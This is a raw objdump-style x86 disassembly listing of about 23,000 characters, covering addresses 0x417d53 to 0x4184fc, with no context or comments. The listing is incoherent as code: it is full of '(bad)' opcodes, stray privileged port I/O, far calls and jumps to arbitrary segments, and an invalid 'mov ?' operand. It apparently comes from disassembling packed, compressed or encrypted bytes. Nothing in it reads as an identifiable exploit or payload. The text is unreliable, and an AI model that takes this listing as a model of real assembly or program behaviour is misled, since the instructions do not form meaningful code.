  417d53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d54:	xchg   esi,eax
  417d55:	lahf   
  417d56:	or     ebx,DWORD PTR [esi+esi*2-0x41]
  417d5a:	ss mov edi,0x2b8fb7b8
  417d60:	stos   DWORD PTR es:[edi],eax
  417d61:	(bad)  
  417d62:	mov    eax,ds:0x69ccd2d7
  417d67:	lock push 0x1217f104
  417d6d:	rcr    BYTE PTR [esi+0x445ae445],0x6b
  417d74:	addr16 inc edi
  417d76:	cmp    ah,BYTE PTR [esi-0x5f3acae8]
  417d7c:	icebp  
  417d7d:	leave  
  417d7e:	sahf   
  417d7f:	mov    al,0xa6
  417d81:	sahf   
  417d82:	out    0xf1,al
  417d84:	adc    ah,0xa8
  417d87:	std    
  417d88:	xchg   DWORD PTR [ecx],eax
  417d8a:	xchg   edx,eax
  417d8b:	jl     0x417e0a
  417d8d:	sub    DWORD PTR [ebx+0x7c92808a],edx
  417d93:	cmp    esp,DWORD PTR [ecx-0x302afaac]
  417d99:	int    0xb9
  417d9b:	cmp    eax,eax
  417d9d:	dec    eax
  417d9e:	aad    0x36
  417da0:	mov    eax,0xbc481443
  417da5:	sti    
  417da6:	ficom  WORD PTR [edi]
  417da8:	sbb    ecx,ebx
  417daa:	sahf   
  417dab:	fadd   DWORD PTR [eax+0x17fa58d9]
  417db1:	adc    eax,edi
  417db3:	out    0xd8,al
  417db5:	mov    BYTE PTR [eax-0x3cf2b5fe],al
  417dbb:	mov    ebx,0x5dd657fb
  417dc0:	xor    DWORD PTR [ebx],ebx
  417dc2:	pop    ebx
  417dc3:	push   esi
  417dc4:	jb     0x417df0
  417dc6:	push   ebp
  417dc7:	cmp    DWORD PTR [eax+edx*1],esi
  417dca:	pop    edx
  417dcb:	outs   dx,DWORD PTR ds:[esi]
  417dcc:	mov    ds:0x9a147f99,eax
  417dd1:	push   edi
  417dd2:	mov    eax,ds:0xb9281004
  417dd7:	(bad)  
  417dd8:	cmc    
  417dd9:	jb     0x417d6a
  417ddb:	call   0xbd42:0x52210d92
  417de2:	xor    eax,0x3dba8d48
  417de7:	mov    ds:0x65607001,eax
  417dec:	sbb    DWORD PTR [edi+0x5],0x62fb7e43
  417df3:	and    bh,BYTE PTR [eax]
  417df5:	sub    BYTE PTR [edx+0x6e36cf43],dh
  417dfb:	leave  
  417dfc:	xchg   ecx,eax
  417dfd:	sbb    dl,bl
  417dff:	cwde   
  417e00:	repz jne 0x417e17
  417e03:	jecxz  0x417e77
  417e05:	es lahf 
  417e07:	dec    edx
  417e08:	lds    esp,FWORD PTR [edx]
  417e0a:	pop    esp
  417e0b:	cld    
  417e0c:	rol    ecx,0xff
  417e0f:	sti    
  417e10:	add    BYTE PTR [ebx],bh
  417e12:	jl     0x417dba
  417e14:	jle    0x417db2
  417e16:	jns    0x417e24
  417e18:	in     al,dx
  417e19:	cmp    eax,0x1f54d7f6
  417e1e:	ficom  WORD PTR [esp+esi*8]
  417e21:	xchg   BYTE PTR [esi-0x1d1ef43e],dh
  417e27:	adc    al,0x9d
  417e29:	std    
  417e2a:	jno    0x417e46
  417e2c:	aaa    
  417e2d:	and    edx,DWORD PTR [edx+0x59]
  417e30:	nop
  417e31:	inc    edx
  417e32:	inc    eax
  417e33:	gs mov al,0x67
  417e36:	lock sbb ah,BYTE PTR cs:[edx]
  417e3a:	pop    esp
  417e3b:	pop    ebx
  417e3c:	aam    0xa9
  417e3e:	pusha  
  417e3f:	stc    
  417e40:	and    ecx,DWORD PTR [esi+0x547743d0]
  417e46:	cs jae 0x417df6
  417e49:	stos   DWORD PTR es:[edi],eax
  417e4a:	call   0x9ccc046d
  417e4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e50:	out    dx,al
  417e51:	cmp    BYTE PTR [ebp+0x3fca33d3],0xf3
  417e58:	sub    ebp,DWORD PTR [ebx+0x4a]
  417e5b:	ror    DWORD PTR [eax],1
  417e5d:	in     eax,dx
  417e5e:	(bad)  
  417e5f:	fldenv [ebp+0x58d9fc40]
  417e65:	test   BYTE PTR [ebp-0x3b3817cb],dl
  417e6b:	sbb    esp,DWORD PTR [ecx-0x33]
  417e6e:	ss inc esi
  417e70:	aaa    
  417e71:	sbb    al,bh
  417e73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e74:	mov    al,ds:0x1caed8fb
  417e79:	call   0x49fa:0xef585e47
  417e80:	mov    dl,0x37
  417e82:	and    ecx,ebx
  417e84:	loope  0x417e07
  417e86:	loope  0x417e7d
  417e88:	dec    edx
  417e89:	(bad)  
  417e8a:	repz dec esi
  417e8c:	add    ebx,DWORD PTR [edi+0x44602217]
  417e92:	pop    ds
  417e93:	xchg   edx,eax
  417e94:	add    DWORD PTR [ecx*2-0x3fc6ef9d],ebx
  417e9b:	cmp    bl,BYTE PTR [esi+0x77]
  417e9e:	push   edi
  417e9f:	arpl   WORD PTR [ebx-0x2],bp
  417ea2:	fistp  WORD PTR [ecx]
  417ea4:	je     0x417e4b
  417ea6:	cmp    al,ch
  417ea8:	mov    eax,0xd751d4ce
  417ead:	push   edi
  417eae:	(bad)  
  417eaf:	fld    QWORD PTR [ebx]
  417eb1:	pop    ds
  417eb2:	sub    dl,bh
  417eb4:	(bad)  
  417eb5:	out    dx,eax
  417eb6:	add    eax,edx
  417eb8:	rcl    edi,1
  417eba:	dec    esp
  417ebb:	das    
  417ebc:	das    
  417ebd:	xchg   DWORD PTR [edi-0xb],esp
  417ec0:	sbb    eax,0x7d6ee79f
  417ec5:	fiadd  DWORD PTR [eax-0x2e]
  417ec8:	xor    al,0x59
  417eca:	push   esi
  417ecb:	arpl   dx,di
  417ecd:	and    dl,BYTE PTR [esi]
  417ecf:	adc    dh,dh
  417ed1:	jo     0x417efe
  417ed3:	adc    DWORD PTR [ebp+0x89f5b2b],0x1d
  417eda:	ja     0x417edc
  417edc:	in     al,0x59
  417ede:	inc    edx
  417edf:	jl     0x417f07
  417ee1:	pop    esp
  417ee2:	in     eax,0x33
  417ee4:	daa    
  417ee5:	pusha  
  417ee6:	int    0x5e
  417ee8:	test   al,0x2d
  417eea:	and    DWORD PTR [eax+0xcefcdfc],0x28546ffc
  417ef4:	test   edx,0x98d0a85b
  417efa:	jl     0x417f2e
  417efc:	xor    DWORD PTR [ebx+0x6b],edx
  417eff:	push   ecx
  417f00:	imul   edx,ebp,0xe30205ab
  417f06:	dec    esi
  417f07:	jmp    0xcab3:0xa7f012db
  417f0e:	push   ss
  417f0f:	push   ds
  417f10:	ret    0x4a86
  417f13:	or     DWORD PTR ss:[eax],edi
  417f16:	loopne 0x417ebe
  417f18:	sti    
  417f19:	jge    0x417e9f
  417f1b:	jo     0x417f31
  417f1d:	and    al,0x78
  417f1f:	mov    cl,0x51
  417f21:	jge    0x417f8d
  417f23:	je     0x417f5b
  417f25:	scas   eax,DWORD PTR es:[edi]
  417f26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f27:	fist   WORD PTR [eax+0x77]
  417f2b:	(bad)  
  417f2c:	out    0xe0,eax
  417f2e:	ror    cl,0xf4
  417f31:	adc    ch,BYTE PTR [esi]
  417f33:	pop    edx
  417f34:	(bad)  
  417f35:	test   DWORD PTR [ecx],0xa52ec284
  417f3b:	enter  0x34ba,0xc6
  417f3f:	fsubr  st,st(4)
  417f41:	and    dl,BYTE PTR [edi]
  417f43:	pop    ebp
  417f44:	fild   DWORD PTR [ebp+0x65]
  417f47:	xor    eax,DWORD PTR [edx]
  417f49:	inc    esi
  417f4a:	icebp  
  417f4b:	and    DWORD PTR [eax-0x3a8dc561],edx
  417f51:	out    0x4c,al
  417f53:	dec    edi
  417f54:	mul    BYTE PTR [edi+0x6ed0eb5f]
  417f5a:	mov    edi,0x472491c7
  417f5f:	xchg   edx,eax
  417f60:	int    0xe1
  417f62:	pop    ss
  417f63:	jp     0x417f18
  417f65:	adc    edi,DWORD PTR [edx+0x4c]
  417f68:	jb     0x417fb7
  417f6a:	and    eax,DWORD PTR [ecx]
  417f6c:	mov    ecx,0xdb03d0a
  417f71:	enter  0x741b,0x30
  417f75:	and    ebx,DWORD PTR [ecx]
  417f77:	mov    edx,0xf29d2e1d
  417f7c:	inc    edx
  417f7d:	adc    DWORD PTR [ebx-0x4a],ecx
  417f80:	and    al,0x81
  417f82:	sbb    ch,BYTE PTR [ecx-0x2e]
  417f85:	xchg   ebx,eax
  417f86:	push   0x4c7af13b
  417f8b:	in     al,0x7a
  417f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f8e:	ins    BYTE PTR es:[edi],dx
  417f8f:	and    ebx,DWORD PTR [ebp+0x6d21c399]
  417f95:	scas   eax,DWORD PTR es:[edi]
  417f96:	sbb    ebx,DWORD PTR [edi+0x6b]
  417f99:	sti    
  417f9a:	push   edx
  417f9b:	fild   WORD PTR [eax]
  417f9d:	sub    DWORD PTR [ebx],ebx
  417f9f:	scas   al,BYTE PTR es:[edi]
  417fa0:	or     DWORD PTR [edx-0xed85e2a],ebp
  417fa6:	fild   DWORD PTR [ecx]
  417fa8:	inc    ah
  417faa:	aaa    
  417fab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fac:	outs   dx,BYTE PTR ds:[esi]
  417fad:	or     DWORD PTR [ebx+0x62790b91],ebx
  417fb3:	and    dh,bl
  417fb5:	test   DWORD PTR [ebx+0x46],esp
  417fb8:	xchg   edx,eax
  417fb9:	xor    bl,BYTE PTR [esi]
  417fbb:	inc    eax
  417fbc:	mov    bl,0x59
  417fbe:	fistp  DWORD PTR [ebx]
  417fc0:	push   ds
  417fc1:	das    
  417fc2:	and    ebp,DWORD PTR [ecx+0x18c8aa2e]
  417fc8:	mov    gs,WORD PTR [edi-0x47]
  417fcb:	mov    eax,0x2bf453dd
  417fd0:	xlat   BYTE PTR ds:[ebx]
  417fd2:	retf   
  417fd3:	fwait
  417fd4:	mov    ds:0x6b7f9660,al
  417fd9:	push   ebp
  417fda:	adc    eax,0x1ad0b969
  417fdf:	adc    dh,BYTE PTR [eax-0x32ace08c]
  417fe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fe6:	mov    esp,0xa7e71c0f
  417feb:	rol    cl,cl
  417fed:	nop
  417fee:	int    0xd9
  417ff0:	push   ebp
  417ff1:	mov    eax,ds:0x8611ca0
  417ff6:	cwde   
  417ff7:	push   ebp
  417ff8:	popf   
  417ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ffa:	xlat   BYTE PTR ds:[ebx]
  417ffb:	jl     0x418059
  417ffd:	js     0x417fa6
  417fff:	addr16 jge 0x418028
  418002:	mov    dl,0x66
  418004:	sbb    DWORD PTR [ebx-0x29],esp
  418007:	sbb    ebp,DWORD PTR [ebx-0x6b546f34]
  41800d:	(bad)  
  41800e:	fsubr  QWORD PTR [ebp+0x3ddcd63d]
  418014:	pop    ebx
  418015:	je     0x417fe9
  418017:	jne    0x41806f
  418019:	ja     0x418012
  41801b:	clc    
  41801c:	(bad)  
  41801d:	imul   edx,DWORD PTR [edx+ebp*1-0x6ab8d27d],0x870f76ad
  418028:	push   ebx
  418029:	ror    BYTE PTR [esi],cl
  41802b:	ins    DWORD PTR es:[edi],dx
  41802c:	stos   BYTE PTR es:[edi],al
  41802d:	mov    ah,0x4d
  41802f:	inc    edx
  418030:	rcr    DWORD PTR ds:0xa5304816,cl
  418036:	jae    0x417fdd
  418038:	xlat   BYTE PTR ds:[ebx]
  418039:	(bad)  
  41803a:	(bad)  
  41803c:	add    al,0x62
  41803e:	pop    ecx
  41803f:	daa    
  418040:	inc    ebx
  418041:	psubb  mm5,mm0
  418044:	xchg   edx,eax
  418045:	dec    edx
  418046:	add    ah,0x0
  418049:	dec    ebx
  41804a:	dec    edx
  41804b:	xchg   ecx,eax
  41804c:	test   al,0x2d
  41804e:	xor    eax,0x60a7ff9e
  418053:	mov    ds:0x92f18853,eax
  418058:	push   0xe9a85dad
  41805d:	push   ecx
  41805e:	retf   0xf318
  418061:	inc    ecx
  418062:	jle    0x41806c
  418064:	xor    ebp,esp
  418066:	add    DWORD PTR [edi+0x45600f42],ebx
  41806c:	data16 stc 
  41806e:	jp     0x41807d
  418070:	and    DWORD PTR ds:0xca0eafd6,eax
  418076:	jmp    0x3a85c961
  41807b:	fmul   DWORD PTR [ebx+0x2a5c177a]
  418081:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  418083:	jo     0x4180ca
  418085:	dec    edx
  418086:	(bad)  
  418088:	jle    0x4180a5
  41808a:	std    
  41808b:	stos   DWORD PTR es:[edi],eax
  41808c:	stos   BYTE PTR es:[edi],al
  41808d:	xor    ah,cl
  41808f:	ss aas 
  418091:	jge    0x41805d
  418093:	out    0x27,eax
  418095:	xor    al,0x9e
  418097:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  418099:	jae    0x4180fa
  41809b:	jecxz  0x4180bc
  41809d:	pop    ebx
  41809e:	push   cs
  41809f:	retf   
  4180a0:	inc    ebp
  4180a1:	mov    ah,0x39
  4180a3:	jbe    0x418055
  4180a5:	outs   dx,BYTE PTR ds:[esi]
  4180a6:	push   0xf9c34d91
  4180ab:	sahf   
  4180ac:	cmp    esp,DWORD PTR [ebx*1-0x24aeda51]
  4180b3:	and    esp,ebx
  4180b5:	lahf   
  4180b6:	adc    BYTE PTR [ebx],ch
  4180b8:	mov    ebx,0x73fdb350
  4180bd:	cmp    al,0x6b
  4180bf:	jp     0x418043
  4180c1:	mov    dl,0x1d
  4180c3:	and    al,0xe5
  4180c5:	mov    DWORD PTR [edi+esi*8+0xf0e1e88],ecx
  4180cc:	mov    ecx,0x88f3e128
  4180d1:	fisub  WORD PTR [esi+0x40]
  4180d4:	xchg   DWORD PTR [edi-0x52],ebx
  4180d7:	leave  
  4180d8:	xor    BYTE PTR [esi],0x9a
  4180db:	pop    ss
  4180dc:	sti    
  4180dd:	and    al,0x6b
  4180df:	daa    
  4180e0:	sub    BYTE PTR [eax+0xd876be0],0x75
  4180e7:	cmp    eax,0xf2b124ec
  4180ec:	leave  
  4180ed:	and    al,0xcf
  4180ef:	loope  0x418074
  4180f1:	lods   al,BYTE PTR ds:[esi]
  4180f2:	cli    
  4180f3:	ins    BYTE PTR es:[edi],dx
  4180f4:	mov    DWORD PTR [esi-0x3],ebp
  4180f7:	dec    ebx
  4180f8:	(bad)  
  4180f9:	jle    0x418104
  4180fb:	pop    esi
  4180fc:	push   eax
  4180fd:	mov    dh,0x62
  4180ff:	rol    BYTE PTR [ebx-0x1b],0xe0
  418103:	jae    0x41814e
  418105:	jb     0x4180c0
  418107:	stc    
  418108:	push   ss
  418109:	stos   DWORD PTR es:[edi],eax
  41810a:	push   cs
  41810b:	pop    eax
  41810c:	or     bl,BYTE PTR [edi-0x1a7a0734]
  418112:	stos   BYTE PTR es:[edi],al
  418113:	in     al,0xc3
  418115:	(bad)  
  418116:	pusha  
  418117:	mov    ebx,0xcbc01fd2
  41811c:	sbb    al,0x8b
  41811e:	in     eax,dx
  41811f:	cwde   
  418120:	rol    BYTE PTR [ecx-0x5f],0xca
  418124:	stc    
  418125:	adc    BYTE PTR [ecx],ah
  418127:	mov    ss,ecx
  418129:	aam    0x69
  41812b:	xor    dh,BYTE PTR [ecx]
  41812d:	fdivp  st(3),st
  41812f:	push   edi
  418130:	jae    0x4180b5
  418132:	inc    ebp
  418133:	lock bound esp,QWORD PTR [eax+0x53]
  418137:	or     BYTE PTR [ecx],bh
  418139:	ror    BYTE PTR [edx],0xf3
  41813c:	fisubr WORD PTR cs:[eax+0x14a31492]
  418143:	mov    eax,ds:0xdba65326
  418148:	and    DWORD PTR [esi],ebp
  41814a:	and    esi,DWORD PTR [ecx-0x27]
  41814d:	push   edx
  41814e:	test   BYTE PTR [ecx+0x3b147cfd],0x3
  418155:	jle    0x418108
  418157:	mul    eax
  418159:	xor    al,0xc4
  41815b:	in     eax,0x28
  41815d:	popf   
  41815e:	xchg   edi,eax
  41815f:	rcl    ah,cl
  418161:	ror    BYTE PTR [ecx],0xa2
  418164:	cmp    al,0xa
  418166:	pusha  
  418167:	pop    edi
  418168:	nop
  418169:	out    0xf,eax
  41816b:	pop    esi
  41816c:	cmc    
  41816d:	adc    dl,dl
  41816f:	loope  0x418178
  418171:	std    
  418172:	xchg   edi,eax
  418173:	ja     0x418158
  418175:	sbb    edi,DWORD PTR [eax-0x3c]
  418178:	out    0xbe,eax
  41817a:	cli    
  41817b:	mov    esp,0x847f44ee
  418180:	mov    BYTE PTR [ecx+0x15262ad5],cl
  418186:	adc    eax,DWORD PTR [esi]
  418188:	mov    eax,ds:0x1a5da1c1
  41818d:	mov    edi,0xd2732449
  418192:	mov    cl,0x77
  418194:	mov    gs,WORD PTR [ecx]
  418196:	lods   eax,DWORD PTR ds:[esi]
  418197:	adc    DWORD PTR [ebx],ebx
  418199:	inc    ebx
  41819a:	test   al,bl
  41819c:	xchg   ebp,eax
  41819d:	rcr    dl,1
  41819f:	cwde   
  4181a0:	cmp    eax,0x6c386e72
  4181a5:	and    eax,0x45ae8d5a
  4181aa:	out    dx,eax
  4181ab:	dec    esi
  4181ac:	hlt    
  4181ad:	mov    al,0xdc
  4181af:	xchg   ebp,eax
  4181b0:	pop    ecx
  4181b1:	mov    cl,0x1
  4181b3:	out    0x43,al
  4181b5:	loopne 0x4181d5
  4181b7:	cmc    
  4181b8:	test   esi,ebp
  4181ba:	inc    edx
  4181bb:	(bad)  
  4181bc:	retf   0xccc9
  4181bf:	dec    esp
  4181c0:	lahf   
  4181c1:	mov    edi,0x23b01f71
  4181c6:	jg     0x418162
  4181c8:	sub    DWORD PTR [edi+0x3],esi
  4181cb:	and    BYTE PTR [esp+ebx*2+0x72615e0b],cl
  4181d2:	mov    esp,DWORD PTR [ecx]
  4181d4:	(bad)  
  4181d5:	sbb    dh,BYTE PTR [edx+0x57]
  4181d8:	aam    0xcc
  4181da:	xor    BYTE PTR [ebp+0x6e],ah
  4181dd:	ror    ebp,1
  4181df:	pop    ss
  4181e0:	neg    DWORD PTR [ecx-0x20e0760d]
  4181e6:	in     al,dx
  4181e7:	jbe    0x41819a
  4181e9:	cmc    
  4181ea:	aad    0x25
  4181ec:	xlat   BYTE PTR ds:[ebx]
  4181ed:	jmp    DWORD PTR [ecx+0x42b4a516]
  4181f3:	and    cl,bl
  4181f5:	mov    eax,ds:0xc8384636
  4181fa:	and    DWORD PTR [ecx+0x7e],edx
  4181fd:	add    eax,0xad784360
  418202:	sbb    eax,0xe6184252
  418207:	cmc    
  418208:	ins    BYTE PTR es:[edi],dx
  418209:	add    DWORD PTR [edi],ebp
  41820b:	mov    ?,edi
  41820d:	aam    0x41
  41820f:	jge    0x4181d3
  418211:	out    dx,eax
  418212:	shr    BYTE PTR [edx+eax*4-0x314d3e2e],1
  418219:	xor    DWORD PTR [edi+0x77],edi
  41821c:	jle    0x418204
  41821e:	jne    0x4181aa
  418220:	mov    al,ds:0xf252376f
  418225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418226:	imul   edx,DWORD PTR [ebx-0x3],0xf954073f
  41822d:	rcr    BYTE PTR [ecx+edi*4-0x76cdb0c],1
  418234:	dec    ebp
  418235:	mov    cs,WORD PTR [ebp-0x44e176e]
  41823b:	and    esp,edx
  41823d:	pop    esi
  41823e:	sar    DWORD PTR ds:0x61ca4ab4,0x97
  418245:	mov    bl,0x37
  418247:	ss jae 0x418207
  41824a:	hlt    
  41824b:	out    dx,eax
  41824c:	cmc    
  41824d:	and    cl,BYTE PTR [edi]
  41824f:	cld    
  418250:	in     al,dx
  418251:	or     BYTE PTR [ecx-0x39],dh
  418254:	aas    
  418255:	mov    edx,0x6cd0f1ab
  41825a:	fadd   QWORD PTR [esi+ebx*4-0x32]
  41825e:	daa    
  41825f:	shl    BYTE PTR [esi+edx*8-0x4d],0x4e
  418264:	pop    edi
  418265:	jle    0x41828a
  418267:	xor    eax,0x3208fcfb
  41826c:	aas    
  41826d:	push   ebp
  41826e:	or     eax,0x2a99c0c3
  418273:	cmp    al,0x4e
  418275:	cmp    eax,0xbcc27a34
  41827a:	cld    
  41827b:	push   0x3fd0b692
  418280:	add    ecx,esi
  418282:	into   
  418283:	es stc 
  418285:	inc    edi
  418286:	or     BYTE PTR ds:0x57d2f611,0xe8
  41828d:	popa   
  41828e:	loope  0x418304
  418290:	dec    ebx
  418291:	sub    eax,0xa51fd1fe
  418296:	sti    
  418297:	push   edi
  418298:	int3   
  418299:	jo     0x4182f2
  41829b:	mov    edx,0x72bdcf01
  4182a0:	pop    edi
  4182a1:	mov    eax,ds:0xe24f7f70
  4182a6:	mov    BYTE PTR [esi-0x1a878055],0xd2
  4182ad:	mov    bl,0xe6
  4182af:	mov    ebx,0xb12c5a77
  4182b4:	outs   dx,DWORD PTR ds:[esi]
  4182b5:	lea    eax,[eax-0x343ce780]
  4182bb:	add    ebx,DWORD PTR [ecx+0x1e123bf8]
  4182c1:	jb     0x4182cf
  4182c3:	out    0x37,eax
  4182c5:	les    ecx,FWORD PTR [esi-0xe60e9cf]
  4182cb:	pushf  
  4182cc:	(bad)  
  4182ce:	arpl   WORD PTR [ebp+0x16],dx
  4182d1:	fidivr WORD PTR [eax+edi*4+0x42]
  4182d5:	jno    0x418295
  4182d7:	repnz push esp
  4182d9:	xor    ebp,DWORD PTR [ecx-0x31]
  4182dc:	jle    0x4182ec
  4182de:	xchg   ebx,eax
  4182df:	sub    al,0x32
  4182e1:	cmp    al,0x55
  4182e3:	call   0xa05:0x53e97303
  4182ea:	xor    al,bl
  4182ec:	mov    ds:0x87aa5cba,al
  4182f1:	xchg   ebp,eax
  4182f2:	arpl   cx,bx
  4182f4:	jecxz  0x4182e9
  4182f6:	addr16 inc esi
  4182f8:	sbb    DWORD PTR [ebp-0x337453fe],ebp
  4182fe:	mov    al,BYTE PTR [ebx]
  418300:	jae    0x4182ff
  418302:	rcr    DWORD PTR ds:0x94c58eab,cl
  418308:	ss pop edi
  41830a:	in     al,0x91
  41830c:	out    0xd6,eax
  41830e:	repnz out dx,al
  418310:	pop    ss
  418311:	push   es
  418312:	pop    edx
  418313:	gs dec ecx
  418315:	pop    edi
  418316:	adc    bh,BYTE PTR [edi-0x6f]
  418319:	mov    al,ds:0xec1c4adf
  41831e:	and    DWORD PTR [ecx+ebx*4-0x52],ebp
  418322:	adc    DWORD PTR [ebx+0x3405a7c1],ecx
  418328:	aas    
  418329:	ins    BYTE PTR es:[edi],dx
  41832a:	shl    DWORD PTR [edx+edx*2],1
  41832d:	mov    bl,0x70
  41832f:	push   ebx
  418330:	rcl    DWORD PTR [esp+esi*1-0xe],0x90
  418335:	outs   dx,DWORD PTR ds:[esi]
  418336:	cdq    
  418337:	jno    0x418340
  418339:	(bad)  
  41833a:	nop
  41833b:	sbb    BYTE PTR [ebx-0x74],0xc7
  41833f:	lds    eax,FWORD PTR [ecx+0x29e1ab23]
  418345:	stos   BYTE PTR es:[edi],al
  418346:	repnz dec ecx
  418348:	or     eax,0x898ef750
  41834d:	es push 0xe162acdc
  418353:	push   0x70
  418355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418356:	sub    DWORD PTR [eax-0x4f],ebp
  418359:	dec    edx
  41835a:	and    BYTE PTR [ecx+0x1405a1c3],0x74
  418361:	or     DWORD PTR [ebx+edi*8],eax
  418364:	rol    ah,0x9
  418367:	cmp    al,0x38
  418369:	mov    ch,0xc7
  41836b:	sub    eax,DWORD PTR [esi+0x4c]
  41836e:	pop    edi
  41836f:	dec    eax
  418370:	cdq    
  418371:	sub    ebp,DWORD PTR [ebp+0x32c0925e]
  418377:	cmp    DWORD PTR [ebx+edx*4+0x54],0x58
  41837c:	div    ebp
  41837e:	sub    bh,dh
  418380:	xor    ah,BYTE PTR [esi-0x25]
  418383:	jmp    0x4183ba
  418385:	jne    0x4183a5
  418387:	add    DWORD PTR [ebp+0x6b71bc91],edi
  41838d:	(bad)  
  41838e:	push   ss
  41838f:	xchg   ecx,eax
  418390:	mov    BYTE PTR [esi+0x251bf890],0xe4
  418397:	jl     0x418346
  418399:	inc    edi
  41839a:	outs   dx,BYTE PTR ds:[esi]
  41839b:	or     ah,BYTE PTR [edi+0x40bfd671]
  4183a1:	sbb    bh,BYTE PTR [edi-0x6c65bde3]
  4183a7:	inc    edx
  4183a8:	sub    BYTE PTR [edi+0x45],dh
  4183ab:	out    0x9c,eax
  4183ad:	mov    ebp,0xae074b89
  4183b2:	mov    esi,0xa0a0fb9a
  4183b7:	cmp    esp,ecx
  4183b9:	xchg   edi,eax
  4183ba:	pop    ebx
  4183bb:	xchg   ebx,eax
  4183bc:	test   eax,0x8b00fc00
  4183c1:	lods   al,BYTE PTR ds:[esi]
  4183c2:	lods   eax,DWORD PTR ds:[esi]
  4183c3:	xor    eax,0x654d5fba
  4183c8:	pop    eax
  4183c9:	mov    ch,0x9f
  4183cb:	sbb    cl,bl
  4183cd:	popa   
  4183ce:	sbb    dh,BYTE PTR [ecx]
  4183d0:	repnz shr DWORD PTR [edi-0x4a],cl
  4183d4:	mov    ebp,0x98d28c68
  4183d9:	inc    eax
  4183da:	mov    ds:0xfddcb590,eax
  4183df:	add    eax,0xa1c448fd
  4183e4:	fstp   TBYTE PTR [ebx]
  4183e6:	fld    QWORD PTR [ebp-0x31c7959e]
  4183ec:	idiv   DWORD PTR [eax+esi*8+0x75]
  4183f0:	sbb    BYTE PTR [ecx],dl
  4183f2:	fistp  QWORD PTR [esi]
  4183f4:	jbe    0x4183b7
  4183f6:	retf   0x7d51
  4183f9:	or     ebx,DWORD PTR [ecx]
  4183fb:	pop    es
  4183fc:	jae    0x4183f9
  4183fe:	pop    esi
  4183ff:	push   ecx
  418400:	or     esp,DWORD PTR [ebx]
  418402:	leave  
  418403:	jp     0x4183dd
  418405:	sub    BYTE PTR [ecx],al
  418407:	jns    0x4183d1
  418409:	mov    bh,0x7e
  41840b:	mov    ah,0xf5
  41840d:	lock xchg ebx,eax
  41840f:	jno    0x4183a6
  418411:	xor    DWORD PTR [edi+0x9966f7a],edx
  418417:	es dec esp
  418419:	iret   
  41841a:	and    al,0x63
  41841c:	inc    esi
  41841d:	(bad)  
  41841e:	retf   
  41841f:	mov    BYTE PTR ds:0x833c9500,al
  418425:	jo     0x4183a8
  418427:	adc    ch,dh
  418429:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41842a:	mov    dl,0x3a
  41842c:	pusha  
  41842d:	(bad)  
  41842e:	(bad)  
  418430:	ror    BYTE PTR [edx-0x44],cl
  418433:	or     al,BYTE PTR [eax]
  418435:	push   eax
  418436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418437:	inc    ecx
  418438:	ja     0x4183c1
  41843a:	outs   dx,BYTE PTR ds:[esi]
  41843b:	mov    cl,0x90
  41843d:	(bad)  
  41843e:	aam    0x17
  418440:	sub    BYTE PTR [edi+0x60ccba24],al
  418446:	out    0x34,eax
  418448:	dec    esp
  418449:	sub    esi,DWORD PTR [edx]
  41844b:	xchg   edi,eax
  41844c:	mov    esp,0xf9040b0f
  418451:	xchg   ebx,eax
  418452:	xchg   edx,eax
  418453:	int    0x8e
  418455:	or     eax,0xb64200ef
  41845a:	in     eax,0x7d
  41845c:	mov    edx,ebx
  41845e:	xchg   esi,eax
  41845f:	(bad)  [ebx]
  418461:	dec    esi
  418462:	iret   
  418463:	jne    0x4184c6
  418465:	out    0xd6,al
  418467:	jbe    0x41849c
  418469:	in     eax,dx
  41846a:	push   0xfffffff9
  41846c:	xchg   esi,eax
  41846d:	popa   
  41846e:	call   0xd6812748
  418473:	xchg   DWORD PTR [ebp-0x98ba637],ebp
  418479:	arpl   sp,cx
  41847b:	sbb    esi,DWORD PTR [esi]
  41847d:	or     dh,dh
  41847f:	int3   
  418480:	and    eax,0x36327afe
  418485:	mul    BYTE PTR [ebp-0x3c]
  418488:	gs push ebp
  41848a:	test   DWORD PTR [eax+0x7c],ebp
  41848d:	add    al,0x8
  41848f:	aaa    
  418490:	into   
  418491:	int3   
  418492:	(bad)  
  418493:	mov    dl,BYTE PTR [ecx-0xd]
  418496:	push   DWORD PTR [ebx+0x228ea6ed]
  41849c:	xor    eax,0x339b7f44
  4184a1:	(bad)  ds:0xf7f52082
  4184a7:	ds leave 
  4184a9:	sbb    ebp,edi
  4184ab:	lds    esp,FWORD PTR [ebx+0x2a]
  4184ae:	cld    
  4184af:	sbb    al,0x4c
  4184b1:	div    BYTE PTR [edx+0x71]
  4184b4:	cmp    BYTE PTR [edi+ebx*8+0x18cc6ce5],ch
  4184bb:	and    ebx,ebx
  4184bd:	ds sahf 
  4184bf:	jb     0x418535
  4184c1:	add    BYTE PTR [ebp+0x7e],bl
  4184c4:	ror    DWORD PTR [eax],0xb2
  4184c7:	xor    BYTE PTR [ebx],bl
  4184c9:	fwait
  4184ca:	jo     0x4184a9
  4184cc:	add    dh,BYTE PTR [esi+0x1c748d17]
  4184d2:	iret   
  4184d3:	or     al,cl
  4184d5:	loop   0x41850d
  4184d7:	add    eax,0xb196c97f
  4184dc:	mov    esp,DWORD PTR [esi]
  4184de:	bound  ebx,QWORD PTR [edi+0x6d]
  4184e1:	mov    ebp,0x32db50bd
  4184e6:	mov    al,0x49
  4184e9:	push   ebp
  4184ea:	sti    
  4184eb:	add    dh,dh
  4184ed:	lods   al,BYTE PTR ds:[esi]
  4184ee:	ret    
  4184ef:	daa    
  4184f0:	sub    eax,0x5bcee638
  4184f5:	mov    ?,eax
  4184f7:	dec    edx
  4184f8:	sar    dl,0x78
  4184fb:	into   
  4184fc:	scas   al,BYTE PTR es:[edi]
